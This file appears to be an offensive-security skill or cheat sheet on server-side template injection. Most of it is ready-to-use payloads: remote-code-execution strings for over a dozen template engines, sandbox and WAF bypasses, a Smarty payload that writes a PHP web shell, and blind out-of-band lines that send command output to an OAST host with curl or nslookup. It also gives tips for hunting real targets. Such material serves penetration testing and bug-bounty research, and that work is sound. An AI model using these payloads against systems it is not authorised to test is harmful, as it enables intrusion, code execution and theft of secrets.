---
name: ssti
category: vulnerabilities
description: Server-Side Template Injection — detection polyglots, engine-specific payloads for Jinja2/Mako/Tornado/Django (Python), FreeMarker/Velocity/Pebble/Thymeleaf (Java), Twig/Smarty (PHP), ERB (Ruby), Handlebars/Pug/EJS (JS), sandbox escape techniques, and RCE paths
depends_on: []
---

# Server-Side Template Injection (SSTI)

Templates render untrusted data safely when user input is treated as data.
SSTI happens when user input is **concatenated into the template source**
— allowing attacker code to execute in the template engine's evaluation
context, usually with host-language runtime access → RCE.

Distinct from client-side template injection (CSTI) — here the code runs
on the server.

## When to Use

- Target has profile / preference / templating features ("welcome {name}")
- Email / SMS templating (user-editable)
- Error page renders user input back
- Subject lines, export formats, report generation accepting user text
- Any 500 with template engine name in stack trace
- Admin-editable templates (low-priv escalation)
- Password reset / invite flows where name appears in outbound email
- CMS / headless CMS admin template editors (Strapi, Directus, Payload)
- Workflow engines with templated commands (Airflow, Jenkins, Argo)

## Discovery Signals

Fingerprints that indicate a template engine is in play before you send a probe.

| Signal | What It Suggests |
|--------|-----------------|
| `X-Powered-By: Express` | EJS, Pug, Handlebars, Nunjucks (Node.js) |
| `Server: Werkzeug` or Flask debug traceback | Jinja2 (Python) |
| `Server: Tornado` | Tornado templates (Python) |
| Spring Boot error page (`Whitelabel Error Page`) | Thymeleaf or FreeMarker (Java) |
| Symfony profiler bar or `X-Debug-Token` | Twig (PHP) |
| `X-Powered-By: PHP` + Smarty error in stack | Smarty (PHP) |
| `Set-Cookie: JSESSIONID` + `${...}` reflection | FreeMarker, Velocity, SpEL, Thymeleaf (Java) |
| Confluence / Atlassian branding | Velocity (Java) |
| Apache Solr admin UI | Velocity via VelocityResponseWriter |
| Rails exception page (`ActionView::Template::Error`) | ERB (Ruby) |
| `.ejs` file extension in error path | EJS (Node.js) |
| `_.template` or lodash in JS bundle | lodash template (Node.js) — `Function()` compiler |

## Detection

### The universal polyglot

Send in every reflected input:

```
${{<%[%'"}}%\
${7*7}
{{7*7}}
${{7*7}}
<%=7*7%>
#{7*7}
```

Watch reflected output. `49` = math was evaluated → some engine parsed it.

Then narrow the engine:

| Output | Engine |
|--------|--------|
| `49` with `{{7*7}}` | Jinja2 / Django / Twig / Handlebars family |
| `49` with `${7*7}` | FreeMarker / Velocity / Spring SpEL / JSP EL |
| `49` with `#{7*7}` | Ruby ERB / Thymeleaf |
| `49` with `<%=7*7%>` | ERB / EJS |
| `{{=7*7}}` works | Vue / Angular (client-side) |

### Engine fingerprint

```
# Jinja2
{{7*'7'}}        → 7777777 in Jinja, '49' in Twig/Django
{{config}}       → dumps config (Flask/Jinja)

# Django
{{settings.SECRET_KEY}}

# Twig
{{7*'7'}}        → 49 (vs Jinja's 7777777)
{{dump(app)}}    → Symfony dump

# FreeMarker
<#assign x=1>${x}
${"freemarker.template.utility.Execute"?new()("id")}

# Velocity
#set($x=1)${x}

# ERB
<%= 7*7 %>
<%= system("id") %>

# Handlebars
{{#with "s" as |string|}}...

# Smarty
{$smarty.version}
```

## Template Engine Detection Matrix

| Engine | Language | Detection Payload | Confirmation Payload | Sandbox? |
|--------|----------|-------------------|---------------------|----------|
| Jinja2 | Python | `{{7*'7'}}` → `7777777` | `{{config.items()}}` | Optional (SandboxedEnvironment) |
| Mako | Python | `${7*7}` → `49` | `<%import os%>${os.name}` | No |
| Tornado | Python | `{{7*7}}` → `49` | `{%import os%}{{os.popen('id').read()}}` | No |
| Twig | PHP | `{{7*'7'}}` → `49` | `{{dump(app)}}` | Yes (restricted methods) |
| Smarty | PHP | `{$smarty.version}` → version | `{system('id')}` (v2) | Partial (v3 deprecated `{php}`) |
| FreeMarker | Java | `${7*7}` → `49` | `<#assign x=1>${x}` | Partial (Execute blacklisted >=2.3.30) |
| Velocity | Java | `#set($x=7*7)${x}` → `49` | `$x.class.forName("java.lang.Runtime")` | No |
| Thymeleaf | Java | `__${7*7}__::.x` → error with `49` | `__${T(java.lang.Runtime)}__::.x` | No |
| SpEL | Java | `${7*7}` → `49` (error page) | `${T(java.lang.Character).toString(65)}` → `A` | No |
| ERB | Ruby | `<%= 7*7 %>` → `49` | `<%= File.open('/etc/passwd').read %>` | No |
| EJS | Node.js | `<%= 7*7 %>` → `49` | `<%= process.env %>` | No |
| Pug | Node.js | `#{7*7}` → `49` | `#{process.platform}` | No |
| Handlebars | Node.js | `{{this}}` → `[object Object]` | `{{this.__proto__.constructor.name}}` → `Object` | Yes (strict mode) |
| Nunjucks | Node.js | `{{7*7}}` → `49` | `{{range(10)}}` → array | Optional |
| lodash | Node.js | `<%= 7*7 %>` → `49` | `<%= typeof process %>` → `object` | No (`Function()` compiler) |

## Per-Engine Exploitation

### Jinja2 (Python — Flask, Ansible, Django-Jinja)

Proof: `{{7*7}}` → `49`, `{{7*'7'}}` → `7777777`.

Classic RCE:
```
{{''.__class__.__mro__[1].__subclasses__()}}
{{''.__class__.__mro__[1].__subclasses__()[<N>]('id', shell=True, stdout=-1).communicate()}}
```

Cleaner modern payload (Jinja2 >= 2.9 with Flask):
```
{{cycler.__init__.__globals__.os.popen('id').read()}}
{{lipsum.__globals__.os.popen('id').read()}}
{{url_for.__globals__.os.popen('id').read()}}
{{get_flashed_messages.__globals__['__builtins__'].__import__('os').popen('id').read()}}
```

Flask config leak: `{{config.items()}}` / `{{config.SECRET_KEY}}`.

### Mako (Python)

```
<% import os; x=os.popen('id').read() %>${x}
${os.popen("id").read()}
```

### Tornado (Python)

```
{% import os %}{{os.popen("id").read()}}
```

### Django Template Language

DTL has no Python eval — SSTI only via custom `{% load %}` tags or switching
to Jinja2 via `django-jinja`.

### FreeMarker (Java)

```
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
```

New versions (>= 2.3.30) blacklist Execute — use:
```
<#assign x=statics["java.lang.Runtime"].getRuntime().exec("id")>${x}
```

### Velocity (Java — Confluence, older Spring)

```
#set($e="e")
#set($str=$e.getClass().forName("java.lang.Runtime"))
#set($cmd="id")
$str.getMethod("exec", $cmd.getClass()).invoke($str.getMethod("getRuntime").invoke(null), $cmd)
```

### Pebble (Java — Spring ecosystem)

```
{{ "freemarker.template.utility.Execute"?new()("id") }}
```

### Thymeleaf (Java — Spring default)

```
http://target/?name=__${new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec("id").getInputStream()).next()}__::.x
```

### Twig (PHP — Symfony, Drupal)

```
{{7*'7'}}          → 49
{{["id",1]|filter("system")}}
{{["id"]|map("system")|join}}
{{['id']|reduce('system')}}
```

Modern sandbox escapes (2024):
```
{{['id',0]|sort('system')|join(',')}}
{{app.request.query.get(0)}}         ← Symfony-specific
```

### Smarty (PHP)

```
{system('id')}                     (Smarty < 3)
{php}system('id');{/php}           (Smarty < 3.1)
```

### ERB (Ruby — Rails, Sinatra)

```
<%= 7*7 %>
<%= system("id") %>
<%= `id` %>
<%= File.open("/etc/passwd").read %>
```

### Handlebars (JavaScript)

Handlebars sandboxes heavily. Known escape:

```
{{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{this.pop}}
      {{this.push (lookup string.sub "constructor")}}
      {{this.pop}}
      {{#with string.split as |codelist|}}
        {{this.pop}}
        {{this.push "return require('child_process').execSync('id');"}}
        {{this.pop}}
        {{#each conslist}}
          {{#with (string.sub.apply 0 codelist)}}
            {{this}}
          {{/with}}
        {{/each}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/with}}
```

### Pug (Jade)

```
#{process.mainModule.require('child_process').execSync('id')}
-var x = process.mainModule.require('child_process').execSync('id')
```

### EJS

```
<%= process.mainModule.require('child_process').execSync('id') %>
```

Vulnerable with `settings[view options][outputFunctionName]` injection (CVE-2022-29078):
```
?settings[view%20options][outputFunctionName]=x;process.mainModule.require('child_process').execSync('id');y
```

## Sandbox Escape Techniques

| Engine | Sandbox/Restriction | Escape Method | Payload |
|--------|-------------------|---------------|---------|
| Jinja2 | `SandboxedEnvironment` | MRO walk to `Popen` via `__subclasses__()` | `{{''.__class__.__mro__[1].__subclasses__()[N]('id',shell=True,stdout=-1).communicate()}}` |
| Jinja2 | `_` prefix blocked | Use `lipsum`/`cycler`/`joiner` globals (no underscore) | `{{cycler.__init__.__globals__.os.popen('id').read()}}` |
| Twig | Sandbox mode (restricted functions) | Callback via `filter`/`sort`/`map`/`reduce` | `{{['id',0]|sort('system')|join}}` |
| FreeMarker | `Execute` blacklisted (>=2.3.30) | Reflection via `statics` or `ObjectConstructor` | `<#assign cl=statics["java.lang.Runtime"].getRuntime().exec("id")>` |
| Thymeleaf | No `new` keyword restriction | Use `T()` for type references + `getRuntime()` | `__${T(java.lang.Runtime).getRuntime().exec('id')}__::.x` |
| SpEL | WAF blocking `Runtime`/`exec` | Build strings from `T(Character).toString(int)` per char | `T(java.lang.Character).toString(82)+...` → `"Runtime"` |
| Handlebars | Strict mode / no proto access | `lookup` helper + `constructor.constructor` chain | `{{#with (lookup this 'constructor')}}{{this ('return process')()}}{{/with}}` |
| EJS | `outputFunctionName` validated (>=3.1.7) | Prototype pollution on `opts` via Express `qs` nesting | `?settings[view%20options][client]=1&settings[view%20options][escape]=x;RCE;` |
| Smarty | `{php}` deprecated (v3+) | `{include}` with PHP file path or modifier abuse | `{Smarty_Internal_Write_File::writeFile('/tmp/sh.php','<?php system($_GET[c]);?>')}` |
| Velocity | No built-in sandbox | Reflection via `$class.forName()` on any object | `$e.getClass().forName("java.lang.Runtime").getMethod("exec",$cmd.getClass())` |

## Blind SSTI Detection

When output is not reflected, use side-channel techniques.

| Technique | Method | Payload Example |
|-----------|--------|-----------------|
| Time-based (Python) | Force sleep via `os.popen` | `{{lipsum.__globals__.os.popen('sleep 5').read()}}` |
| Time-based (Java) | Thread sleep via SpEL | `${T(java.lang.Thread).sleep(5000)}` |
| OOB via DNS/HTTP | Exfil to OAST endpoint | `{{lipsum.__globals__.os.popen('curl OAST.DOMAIN?x=$(id)').read()}}` |
| OOB via DNS (Java) | DNS lookup via `InetAddress` | `${T(java.net.InetAddress).getByName('OAST.DOMAIN')}` |
| Error-based | Force template syntax error, observe 500 | `{{7/0}}` or `{{x.__class__}}` — stack trace leaks engine name |
| Length-based | Compare response sizes | `{{7*7}}` (3 chars) vs `{{7*7*7*7*7}}` (5+ chars) vs literal |

## Defense-Bypass Pairs

| Defense | Bypass | Payload |
|---------|--------|---------|
| `{{` and `}}` blocked | Use `{%` block syntax (Jinja2/Twig) | `{%set x=lipsum.__globals__.os.popen('id').read()%}{{x}}` |
| `_` prefix blocked (Python) | Use `request`, `lipsum`, `cycler` — no underscores needed | `{{cycler.__init__.__globals__.os.popen('id').read()}}` |
| `Runtime`/`exec` WAF (Java) | Build string from `T(Character).toString(int)` char by char | `T(java.lang.Character).toString(82)+toString(117)+...` |
| `system`/`exec` WAF (PHP) | Use `passthru`, `shell_exec`, `proc_open`, or Twig filter callbacks | `{{['id']|map('passthru')}}` |
| HTML entity encoding | Template evaluates before HTML encoding; inject in non-HTML context | URL path/query parameter processed before output encoding |
| Email-only render (no HTTP reflection) | Self-invite or password-reset to attacker email — read rendered output | Set name=`{{7*7}}`, trigger invite, check email for `49` |
| `outputFunctionName` validated (EJS >=3.1.7) | Target `escape` or `localsName` options via prototype pollution | `?settings[view%20options][escape]=x;RCE;var%20z=` |
| CSP / strict output filtering | Use blind SSTI — exfil via OOB DNS/HTTP, no reflected output needed | `{{lipsum.__globals__.os.popen('nslookup $(id).OAST').read()}}` |

## Chain Patterns

SSTI is frequently the pivot in multi-step attack chains.

| Chain | Steps | Corpus Example |
|-------|-------|---------------|
| SSTI → RCE | Detect SSTI in email name field → escalate to `os.popen` | Glovo #1104349: signup name → email render → Smarty `{php}` RCE |
| SSTI → file read | Template engine reads arbitrary files via built-in helpers | ERB `<%= File.read('/etc/passwd') %>`, FreeMarker `<#include "/etc/passwd">` |
| SSTI → SSRF | Template engine makes outbound HTTP via builtins | FreeMarker `<#assign x="http://internal:8080"?url>`, SpEL `${T(java.net.URL)...}` |
| SSTI → secret leak | Dump application config/env via template globals | Flask `{{config.SECRET_KEY}}`, Node.js `<%= process.env %>`, Django `{{settings.DATABASES}}` |
| Auth bypass → SSTI → RCE | Regex path bypass reaches admin template editor | Pentaho: `/require.js` suffix bypasses Spring Security → Thymeleaf SSTI → RCE |
| Prototype pollution → SSTI → RCE | Pollute template engine compile options | doT/lodash: pollution sets `varname` → injected into `Function()` source |
| Filter side-channel → SSTI | Blind filter extraction leaks admin creds → admin template editor | Strapi: `$startsWith` oracle leaks reset token → login → lodash `_.template` RCE |
| SSTI → config/template disclosure | Set delimiter to non-existent char → engine returns raw template source | EJS: `?delimiter=X` → template source leaked in response |

## Tooling

```bash
# tplmap — automated SSTI fuzzer + exploiter
git clone https://github.com/epinna/tplmap
python tplmap.py -u 'https://target.com/?name=*'
```

## Cheat Sheet

| Send | Engine (if 49 reflected) | First RCE |
|------|--------------------------|-----------|
| `{{7*7}}` | Jinja2, Twig, Django | `{{cycler.__init__.__globals__.os.popen('id').read()}}` |
| `${7*7}` | FreeMarker, Velocity, JSP EL | `${"freemarker.template.utility.Execute"?new()("id")}` |
| `#{7*7}` | Ruby ERB, Thymeleaf | `<%= system("id") %>` |
| `<%=7*7%>` | ERB, EJS | `<%= process.mainModule.require('child_process').execSync('id') %>` |

## Pro Tips

1. **Polyglot first** — detection takes 5 seconds. `{{7*7}}` and `${7*7}` catch 90% of engines. Engine ID takes 2 more minutes, RCE is a stretch from there.
2. **`{{7*'7'}}` is the best single discriminator** — Jinja returns `7777777`, Twig returns `49`. Sends you down the right payload tree immediately.
3. **Check ALL output channels** — SSTI in profile name fields renders in emails, PDFs, push notifications, admin dashboards, partner portals, not just HTTP responses. The Glovo and Unikrn bounties were both email-rendered SSTI invisible in the web response.
4. **Email subject lines are overlooked** — signup and invite flows template them. Set your name to `{{7*7}}`, trigger a welcome email, and read the subject.
5. **Error messages leak the engine** — force a syntax error (`{{x}`) and read the 500 stack trace. A Smarty/Jinja2/Thymeleaf error message is a confirmed fingerprint without needing math evaluation.
6. **Template editors are RCE sinks** — any "admin can edit email/notification templates" feature that uses a real template engine (lodash, EJS, Nunjucks, Twig-with-globals) is SSTI the moment you reach the editor. Strapi's lodash `_.template` editor was Critical.
7. **Confluence / Atlassian = Velocity** — one of the most common bounty targets. `#set($x=7*7)${x}` in macro bodies, page titles, or space descriptions.
8. **Prototype pollution chains** — in Node.js apps, any prototype pollution bug + a `Function()`-compiling template engine (lodash, doT, EJS) = RCE without direct template control. Pollute `varname`/`outputFunctionName`/`escape` options.
9. **Shared identity = cross-service SSTI surface** — on platforms with a shared identity service (Google, Microsoft, Meta), set your display name to a polyglot and visit every service that renders it -- each service may use a different template engine, and the $313K Firebase SSTI was found by checking Google Cloud Console rendering of a display name set elsewhere.
